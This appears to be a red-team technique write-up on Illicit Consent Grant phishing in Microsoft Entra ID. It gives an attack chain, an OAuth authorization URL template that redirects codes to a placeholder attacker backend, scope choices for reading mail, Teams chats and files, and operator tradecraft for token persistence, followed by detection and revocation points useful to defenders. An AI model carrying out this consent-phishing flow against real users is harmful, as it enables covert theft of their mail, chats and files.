## Overview

The Illicit Consent Grant attack abuses the OAuth 2.0 authorization code flow to redirect delegated tokens to the attacker. The attacker registers a multi-tenant application in their own tenant and crafts an authorization URL that requests delegated permissions over the victim's account. When the victim clicks the link, they authenticate normally against Entra ID — including MFA — and are asked to consent to the app's permission request. If they consent, the resulting authorization code is delivered to the attacker's redirect URI, where it is exchanged for access and refresh tokens.

The attack does not steal credentials. The authentication is legitimate. What is abused is the consent model — the victim's identity has authorized a third-party app to act on their behalf.

## Preconditions

| Requirement | Detail |
|---|---|
| Multi-tenant app registration | App registered in attacker's tenant with `Any organizational directory` account type |
| Delegated permissions configured | Scopes that don't require admin consent: `User.ReadBasic.All`, `Chat.Read`, `Mail.Read`, `Files.Read`, `offline_access` |
| Controlled redirect URI | Backend endpoint to capture the authorization code (`/callback` on attacker-controlled server) |
| Delivery vector | Any channel to reach the victim with the phishing URL |
| CA policy gap | If tenant blocks third-party app consent or OAuth code flows for unmanaged apps, the attack fails |

## Attack Chain

```
Register multi-tenant app  →  in attacker's own tenant
                           →  configure redirect URI on controlled backend
                           →  add delegated permissions (non-admin-consent scopes)
                           ↓
Craft authorization URL    →  client_id=<ATTACKER_APP>
                           →  scope=User.ReadBasic.All Chat.Read offline_access
                           →  response_type=code
                           →  redirect_uri=https://<attacker-backend>/callback
                           ↓
Deliver to victim          →  email, Teams, any channel
                           ↓
Victim authenticates       →  Entra ID login + MFA (legitimate)
                           →  shown app consent screen
                           →  consents to delegated permissions
                           ↓
Entra ID redirects         →  GET https://<attacker-backend>/callback?code=<AUTH_CODE>
                           ↓
Attacker backend           →  POST /oauth2/v2.0/token with code
                           →  receives access_token + refresh_token
                           ↓
Operate as victim          →  within the consented scopes, for up to 90 days
```

## Authorization URL Structure

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
  ?client_id=<ATTACKER_APP_CLIENT_ID>
  &response_type=code
  &redirect_uri=<ENCODED_REDIRECT_URI>
  &response_mode=query
  &scope=User.ReadBasic.All+Chat.Read+offline_access+openid+profile
  &state=<ARBITRARY_CORRELATION_VALUE>
```

`tenant=common` allows any organizational tenant to consent — the attack is not tenant-specific.

## Scope Selection

Scopes that do not require admin consent are the usable surface:

| Scope | Access granted |
|---|---|
| `User.ReadBasic.All` | Read basic profile of all users in the tenant |
| `Chat.Read` | Read all Teams messages of the consenting user |
| `Mail.Read` | Read all email of the consenting user |
| `Files.Read` | Read all OneDrive files of the consenting user |
| `offline_access` | Receive a refresh token for persistent access |

## Operator Notes

- The refresh token is valid as long as the consent is active — up to 90 days with activity. No re-phishing needed for persistence.
- The `tid` claim in the decoded `id_token` reveals the victim's tenant ID — use this to scope future token requests to that tenant specifically.
- The attacker's app client secret is required to exchange the authorization code for tokens. Keep it separate from the phishing infrastructure.
- Admin consent restrictions (`allowedToSignUpEmailBasedSubscriptions`, `permissionGrantPoliciesAssigned`) can block the consent step. Check CA policy during recon if possible.
- Revoking: victims can revoke consent at `myapps.microsoft.com`. Tenant admins can delete the Service Principal from the tenant to invalidate all issued tokens.

## Detection / Friction Points

- Entra ID logs an OAuth2 consent event in the Audit Log — actor, app, scopes, and timestamp are recorded.
- Sign-in logs show the token issuance from the attacker's app client ID — the `clientAppUsed` field identifies the application.
- Microsoft's tenant-level setting `Users can consent to apps accessing company data on their behalf` controls whether this works. If set to `No`, admin consent is required and the attack fails at the consent screen.
- The attacker's multi-tenant app appears as an Enterprise Application in the victim's tenant after first consent — visible to tenant admins.
